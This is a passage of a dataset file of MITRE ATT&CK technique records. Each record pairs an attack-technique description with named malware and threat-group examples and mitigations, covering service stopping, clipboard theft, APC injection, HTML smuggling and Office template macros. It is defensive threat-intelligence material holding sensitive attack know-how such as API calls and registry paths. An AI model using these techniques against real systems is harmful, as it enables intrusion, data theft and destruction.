encrypted via AES.", "Machete has used AES to exfiltrate documents.", "APT12 has used the RIPTIDE RAT, which communicates over HTTP with a payload encrypted with RC4.", "Dipsind encrypts C2 data with AES256 in ECB mode.", "BBSRAT uses a custom encryption algorithm on data sent back to the C2 server over HTTP.", "NETEAGLE will decrypt resources it downloads with HTTP requests by using RC4 with the key \"ScoutEagle.\"", "Dridex has encrypted traffic with RC4.", "MoonWind encrypts C2 traffic using RC4 with a static key.", "SMOKEDHAM has encrypted its C2 traffic with RC4.", "APT28 installed a Delphi backdoor that used a custom algorithm for C2 communications.", "HotCroissant has compressed network communications and encrypted them with a custom stream cipher.", "Azorult can encrypt C2 traffic using XOR."], "is_subtechnique": true}
{"text": " Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) Adversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible (Citation: Novetta Blockbuster). In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server.(Citation: SecureWorks WannaCry Analysis)", "idx": "https://attack.mitre.org/techniques/T1489", "title": "Service Stop", "entity": "Service Stop", "entity_type": "techniques", "entity_context": ["RobbinHood stops 181 Windows services on the system before beginning the encryption process. ", "Babuk can stop specific services related to backups.", "Avaddon looks for and attempts to stop database processes.", "Ryuk has called <code>kill.bat</code> for stopping services, disabling services and killing processes.", "Operate intrusion detection, analysis, and response systems on a separate network from the production environment to lessen the chances that an adversary can see and interfere with critical response functions.", "Pay2Key can stop the MS SQL service at the end of the encryption process to release files locked by the service.", "Lazarus Group has stopped the MSExchangeIS service to render Exchange contents inaccessible to users.", "HotCroissant has the ability to stop services on the infected host.", "WannaCry attempts to kill processes associated with Exchange, Microsoft SQL Server, and MySQL to make it possible to encrypt their data stores.", "EKANS stops database, data backup solution, antivirus, and ICS-related processes.", "Maze has stopped SQL services to ensure it can encrypt any database. ", "Wizard Spider has used taskkill.exe and net.exe to stop backup, catalog, cloud, and other services prior to network encryption.", "Ensure proper process and file permissions are in place to inhibit adversaries from disabling or interfering with critical services.", "Netwalker can terminate system processes and services, some of which relate to backup software.", "LookBack can kill processes and delete services.", "Industroyer’s data wiper module writes zeros into the registry keys in <code>SYSTEM\\CurrentControlSet\\Services</code> to render a system inoperable.", "Cuba has a hardcoded list of services and processes to terminate.", "Indrik Spider has used PsExec to stop services prior to the execution of ransomware.", "Ragnar Locker has attempted to stop services associated with business applications and databases to release the lock on files used by these applications so they may be encrypted.", "Pysa can stop services and processes. ", "SLOTHFULMEDIA has the capability to stop processes and services.", "Ensure proper registry permissions are in place to inhibit adversaries from disabling or interfering with critical services.", "KillDisk terminates various processes to get the user to reboot the victim machine.", "MegaCortex can stop and disable services on the system. ", "Conti can stop up to 146 Windows services related to security, backup, database, and email solutions through the use of <code>net stop</code>.", "Olympic Destroyer uses the API call <code>ChangeServiceConfigW</code> to disable all services on the affected system.", "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations.", "Clop can kill several processes and services related to backups and security solutions. ", "REvil has the capability to stop services and kill processes."], "is_subtechnique": false}
{"text": " Adversaries may collect data stored in the clipboard from users copying information within or between applications. In Windows, Applications can access clipboard data by using the Windows API.(Citation: MSDN Clipboard) OSX provides a native command, <code>pbpaste</code>, to grab clipboard contents.(Citation: Operating with EmPyre)", "idx": "https://attack.mitre.org/techniques/T1115", "title": "Clipboard Data", "entity": "Clipboard Data", "entity_type": "techniques", "entity_context": ["APT38 used a Trojan called KEYLIME to collect data from the clipboard.", "VERMIN collects data stored in the clipboard.", "RTM collects data from the clipboard.", "Remexi collects text from the clipboard.", "Agent Tesla can steal data from the victim’s clipboard.", "RunningRAT contains code to open and copy data from the clipboard.", "CosmicDuke copies and exfiltrates the clipboard contents every 30 seconds.", "Operation Wocao has collected clipboard data in plaintext.", "DarkComet can steal data from the clipboard.", "TinyZBot contains functionality to collect information from the clipboard.", "KONNI had a feature to steal data from the clipboard.", "Remcos steals and modifies data from the clipboard.", "Explosive has a function to use the OpenClipboard wrapper. ", "Empire can harvest clipboard data on both Windows and macOS systems.", "A JHUHUGIT variant accesses a screenshot saved in the clipboard and converts it to a JPG image.", "Attor has a plugin that collects data stored in the Windows clipboard by using the OpenClipboard and GetClipboardData APIs.", "Metamorfo has a function to hijack data from the clipboard by monitoring the contents of the clipboard and replacing the cryptocurrency wallet with the attacker's.", "Zeus Panda can hook GetClipboardData function to watch for clipboard pastes to collect.", "Astaroth collects information from the clipboard by using the OpenClipboard() and GetClipboardData() libraries. ", "jRAT can capture clipboard data.", "Melcoz can monitor content saved to the clipboard.", "MacSpy can steal clipboard contents.", "Koadic can retrieve the current content of the user clipboard.", "TajMahal has the ability to steal data from the clipboard of an infected host.\n", "Catchamas steals data stored in the clipboard.", "APT39 has used tools capable of stealing contents of the clipboard.", "Grandoreiro can capture clipboard data from a compromised host.", "Machete hijacks the clipboard data by creating an overlapped window that listens to keyboard events. ", "The executable version of Helminth has a module to log clipboard contents.", "MarkiRAT can capture clipboard content.", "Cadelspy has the ability to steal data from the clipboard."], "is_subtechnique": false}
{"text": " Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server. Tools may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).(Citation: Dell TG-3390) Tools can also be staged on web services, such as an adversary controlled GitHub repo. Adversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.", "idx": "https://attack.mitre.org/techniques/T1608/002", "title": "Upload Tool", "entity": "Upload Tool", "entity_type": "techniques", "entity_context": ["Threat Group-3390 has staged tools, including gsecdump and WCE, on previously compromised websites.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."], "is_subtechnique": true}
{"text": " Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle. In addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.(Citation: NationsBuying)(Citation: PegasusCitizenLab) In addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.(Citation: DiginotarCompromise)", "idx": "https://attack.mitre.org/techniques/T1588", "title": "Obtain Capabilities", "entity": "Obtain Capabilities", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."], "is_subtechnique": false}
{"text": " Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.", "idx": "https://attack.mitre.org/techniques/T1091", "title": "Replication Through Removable Media", "entity": "Replication Through Removable Media", "entity_type": "techniques", "entity_context": ["Flame contains modules to infect USB sticks and spread laterally to other Windows systems the stick is plugged into using Autorun functionality.", "Mustang Panda has used a customized PlugX variant which could spread through USB connections.", "QakBot has the ability to use removable drives to spread through compromised networks.", "Ramsay can spread itself by infecting other portable executable files on removable drives.\t", "On Windows 10, enable Attack Surface Reduction (ASR) rules to block unsigned/untrusted executable files (such as .exe, .dll, or .scr) from running from USB removable drives. ", "Stuxnet can propagate via removable media using an autorun.inf file or the CVE-2010-2568 LNK vulnerability.", "USBStealer drops itself onto removable media and relies on Autorun to execute the malicious file when a user opens the removable media on another system.", "Limit the use of USB devices and removable media within a network.", "Crimson can spread across systems by infecting removable media.", "Conficker variants used the Windows AUTORUN feature to spread through USB propagation.", "APT28 uses a tool to infect connected USB devices and transmit itself to air-gapped computers when the infected USB device is inserted.", "USBferry can copy its installer to attached USB storage devices.", "APT30 may have used the SHIPSHAPE malware to move onto air-gapped networks. SHIPSHAPE targets removable drives to spread to other systems by modifying the drive to use Autorun to execute or by hiding legitimate document files and copying an executable to the folder with the same name as the legitimate document.", "Disable Autorun if it is unnecessary.  Disallow or restrict removable media at an organizational policy level if it is not required for business operations. ", "Darkhotel's selective infector modifies executables stored on removable media as a method of spreading across computers.", "njRAT can be configured to spread via removable drives.", "Tropic Trooper has attempted to transfer USBferry from an infected USB device by copying an Autorun function to the target machine.", "H1N1 has functionality to copy itself to removable media.", "Part of APT28's operation involved using CHOPSTICK modules to copy itself to air-gapped machines and using files written to USB sticks to transfer data and command traffic.", "DustySky searches for removable media and duplicates itself onto it.", "Ursnif has copied itself to and infected removable drives for propagation.", "Agent.btz drops itself onto removable media devices and creates an autorun.inf file with an instruction to run that file. When the device is inserted into another system, it opens autorun.inf and loads the malware.", "Unknown Logger is capable of spreading to USB devices."], "is_subtechnique": false}
{"text": " Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment. By using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.", "idx": "https://attack.mitre.org/techniques/T1090/001", "title": "Internal Proxy", "entity": "Internal Proxy", "entity_type": "techniques", "entity_context": ["Operation Wocao can proxy traffic through multiple infected systems.", "Strider has used local servers with both local network and Internet access to act as internal proxy nodes to exfiltrate data from other parts of the network without direct Internet access.", "Pay2Key has designated machines in the compromised network to serve as reverse proxy pivot points to channel communications with C2.", "FatDuke can used pipes to connect machines with restricted internet access to remote machines via other infected hosts.", "Drovorub can use a port forwarding rule on its agent module to relay network traffic through the client module to a remote host on the same network.", "APT29 configured at least one instance of Cobalt Strike to use a network pipe over SMB during the 2020 SolarWinds intrusion.", "Higaisa discovered system proxy settings and used them if available.", "Stuxnet installs an RPC server for P2P communications.", "Hikit supports peer connections.", "The \"ZJ\" variant of BACKSPACE allows \"ZJ link\" infections with Internet access to relay traffic from \"ZJ listen\" to a command server.", "InvisiMole can function as a proxy to create a server that relays communication between the client and C&C server, or between two clients.", "Cobalt Strike can be configured to have commands relayed over a peer-to-peer network of infected hosts. This can be used to limit the number of egress points, or provide access to a host without direct internet access.", "Kazuar has used internal nodes on the compromised network for C2 communications.", "CHOPSTICK used a proxy server between victims and the C2 server.", "MiniDuke can can use a named pipe to forward communications from one compromised machine with internet access to other compromised machines.", "APT39 used custom tools to create SOCK5 and custom protocol proxies between infected hosts.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.", "Duqu can be configured to have commands relayed over a peer-to-peer network of infected hosts if some of the hosts do not have Internet access."], "is_subtechnique": true}
{"text": " Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. APC injection is commonly performed by attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state.(Citation: Microsoft APC) A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can be used to invoke a function (such as <code>LoadLibrayA</code> pointing to a malicious DLL). A variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.(Citation: Microsoft Atom Table) Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.", "idx": "https://attack.mitre.org/techniques/T1055/004", "title": "Asynchronous Procedure Call", "entity": "Asynchronous Procedure Call", "entity_type": "techniques", "entity_context": ["FIN8 has injected malicious code into a new svchost.exe process.", "IcedID has used <code>ZwQueueApcThread</code> to inject itself into remote processes.", "Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process. ", "InvisiMole can inject its code into a trusted process via the APC queue.", "Pillowmint has used the NtQueueApcThread syscall to inject code into svchost.exe.", "Carberp has queued an APC routine to explorer.exe by calling ZwQueueApcThread.", "Attor performs the injection by attaching its code into the APC queue using NtQueueApcThread API.", "TURNEDUP is capable of injecting code into the APC queue of a created Rundll32 process as part of an \"Early Bird injection.\""], "is_subtechnique": true}
{"text": " Adversaries may search and gather information about victims from closed sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data.(Citation: D3Secutrity CTI Feeds) Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.(Citation: ZDNET Selling Data) Adversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).", "idx": "https://attack.mitre.org/techniques/T1597", "title": "Search Closed Sources", "entity": "Search Closed Sources", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": false}
{"text": " Adversaries may modify plist files to automatically run an application when a user logs in. Starting in Mac OS X 10.7 (Lion), users can specify certain applications to be re-opened when a user logs into their machine after reboot. While this is usually done via a Graphical User Interface (GUI) on an app-by-app basis, there are property list files (plist) that contain this information as well located at <code>~/Library/Preferences/com.apple.loginwindow.plist</code> and <code>~/Library/Preferences/ByHost/com.apple.loginwindow.* .plist</code>. An adversary can modify one of these files directly to include a link to their malicious executable to provide a persistence mechanism each time the user reboots their machine (Citation: Methods of Mac Malware Persistence).", "idx": "https://attack.mitre.org/techniques/T1547/007", "title": "Re-opened Applications", "entity": "Re-opened Applications", "entity_type": "techniques", "entity_context": ["Holding the Shift key while logging in prevents apps from opening automatically. ", "This feature can be disabled entirely with the following terminal command: <code>defaults write -g ApplePersistence -bool no</code>."], "is_subtechnique": true}
{"text": " Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments. Domains provide a centralized means of managing how computer resources (ex: computers, user accounts) can act, and interact with each other, on a network. The policy of the domain also includes configuration settings that may apply between domains in a multi-domain/forest environment. Modifications to domain settings may include altering domain Group Policy Objects (GPOs) or changing trust settings for domains, including federation trusts. With sufficient permissions, adversaries can modify domain policy settings. Since domain configuration settings control many of the interactions within the Active Directory (AD) environment, there are a great number of potential attacks that can stem from this abuse. Examples of such abuse include modifying GPOs to push a malicious [Scheduled Task](https://attack.mitre.org/techniques/T1053/005) to computers throughout the domain environment(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) or modifying domain trusts to include an adversary controlled domain where they can control access tokens that will subsequently be accepted by victim domain resources.(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks) Adversaries can also change configuration settings within the AD environment to implement a [Rogue Domain Controller](https://attack.mitre.org/techniques/T1207). Adversaries may temporarily modify domain policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.", "idx": "https://attack.mitre.org/techniques/T1484", "title": "Domain Policy Modification", "entity": "Domain Policy Modification", "entity_type": "techniques", "entity_context": ["Consider implementing WMI and security filtering to further tailor which users and computers a GPO will apply to.", "Identify and correct GPO permissions abuse opportunities (ex: GPO modification privileges) using auditing tools such as BloodHound (version 1.5.1 and later).", "Use least privilege and protect administrative access to the Domain Controller and Active Directory Federation Services (AD FS) server. Do not create service accounts with administrative privileges."], "is_subtechnique": false}
{"text": " Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent DoS condition.", "idx": "https://attack.mitre.org/techniques/T1499/004", "title": "Application or System Exploitation", "entity": "Application or System Exploitation", "entity_type": "techniques", "entity_context": ["Industroyer uses a custom DoS tool that leverages CVE-2015-5374 and targets hardcoded IP addresses of Siemens SIPROTEC devices.", "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport."], "is_subtechnique": true}
{"text": " Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.", "idx": "https://attack.mitre.org/techniques/T1565/001", "title": "Stored Data Manipulation", "entity": "Stored Data Manipulation", "entity_type": "techniques", "entity_context": ["APT38 has used DYEPACK to create, delete, and alter records in databases used for SWIFT transactions.", "Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and manipulate backups.", "Consider encrypting important information to reduce an adversary’s ability to perform tailored data modifications.", "Ensure least privilege principles are applied to important information resources to reduce exposure to data manipulation risk.", "SUNSPOT created a copy of the SolarWinds Orion software source file with a <code>.bk</code> extension to backup the original content, wrote SUNBURST using the same filename but with a <code>.tmp</code> extension, and then moved SUNBURST using <code>MoveFileEx</code> to the original filename with a <code>.cs</code> extension so it could be compiled within Orion software."], "is_subtechnique": true}
{"text": " Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: ActiveMalwareEnergy)(Citation: FBI Flash FIN7 USB) As with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware. Some aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of [Web Services](https://attack.mitre.org/techniques/T1583/006).(Citation: FireEye APT29)", "idx": "https://attack.mitre.org/techniques/T1587/001", "title": "Malware", "entity": "Malware", "entity_type": "techniques", "entity_context": ["TeamTNT has developed custom malware such as Hildegard.", "Night Dragon used privately developed and customized remote access tools.", "APT29 has leveraged numerous pieces of malware that appear to be unique to APT29 and were likely developed for or by the group.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.", "Turla has developed its own unique malware for use in operations.", "Sandworm Team has developed malware for its operations, including malicious mobile applications and destructive malware such as NotPetya and Olympic Destroyer.", "Lazarus Group has developed several custom malware for use in operations.", "FIN7 has developed malware for use in operations, including the creation of infected removable media.", "Cleaver has created customized tools and payloads for functions including ARP poisoning, encryption, credential dumping, ASP.NET shells, web backdoors, process enumeration, WMI querying, HTTP and SMB communications, network interface sniffing, and keystroke logging."], "is_subtechnique": true}
{"text": " An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs. Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)", "idx": "https://attack.mitre.org/techniques/T1578/004", "title": "Revert Cloud Instance", "entity": "Revert Cloud Instance", "entity_type": "techniques", "entity_context": [], "is_subtechnique": true}
{"text": " Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel. Adversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network", "idx": "https://attack.mitre.org/techniques/T1011", "title": "Exfiltration Over Other Network Medium", "entity": "Exfiltration Over Other Network Medium", "entity_type": "techniques", "entity_context": ["Prevent the creation of new network adapters where possible. "], "is_subtechnique": false}
{"text": " Adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS)(Citation: Medium SSL Cert)(Citation: SSLShopper Lookup)(Citation: DigitalShadows CDN)(Citation: Shodan) Adversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).", "idx": "https://attack.mitre.org/techniques/T1596", "title": "Search Open Technical Databases", "entity": "Search Open Technical Databases", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": false}
{"text": " Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service) If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Adversaries may also alter other Registry keys in the service’s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness) The <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the", "idx": "https://attack.mitre.org/techniques/T1574/011", "title": "Services Registry Permissions Weakness", "entity": "Services Registry Permissions Weakness", "entity_type": "techniques", "entity_context": ["Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation. "], "is_subtechnique": true}
{"text": " Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities](https://attack.mitre.org/techniques/T1587)) or obtained ([Obtain Capabilities](https://attack.mitre.org/techniques/T1588)) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Capabilities can also be staged on web services, such as GitHub or Pastebin.(Citation: Volexity Ocean Lotus November 2020) Staging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to): * Staging web resources necessary to conduct [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) when a user browses to a site.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015)(Citation: ATT ScanBox) * Staging web resources for a link target to be used with spearphishing.(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019) * Uploading malware or tools to a location accessible to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).(Citation: Volexity Ocean Lotus November 2020) * Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)).(Citation: DigiCert Install SSL Cert)", "idx": "https://attack.mitre.org/techniques/T1608", "title": "Stage Capabilities", "entity": "Stage Capabilities", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."], "is_subtechnique": false}
{"text": " Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.(Citation: HTML Smuggling Menlo Security 2020)(Citation: Outlflank HTML Smuggling 2018) Adversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as <code>text/plain</code> and/or <code>text/html</code>. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)), potentially bypassing content filters. For example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as <code>msSaveBlob</code>.(Citation: HTML Smuggling Menlo Security 2020)(Citation: MSTIC NOBELIUM May 2021)(Citation: Outlflank HTML Smuggling 2018)(Citation: nccgroup Smuggling HTA 2017)", "idx": "https://attack.mitre.org/techniques/T1027/006", "title": "HTML Smuggling", "entity": "HTML Smuggling", "entity_type": "techniques", "entity_context": ["EnvyScout contains JavaScript code that can extract an encoded blob from its HTML body and write it to disk."], "is_subtechnique": true}
{"text": " Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template) Office Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates may also be stored and pulled from remote locations.(Citation: GlobalDotName Jun 2019) Word Normal.dotm location:<br> <code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code> Excel Personal.xlsb location:<br> <code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code> Adversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.(Citation: GlobalDotName Jun", "idx": "https://attack.mitre.org/techniques/T1137/001", "title": "Office Template Macros", 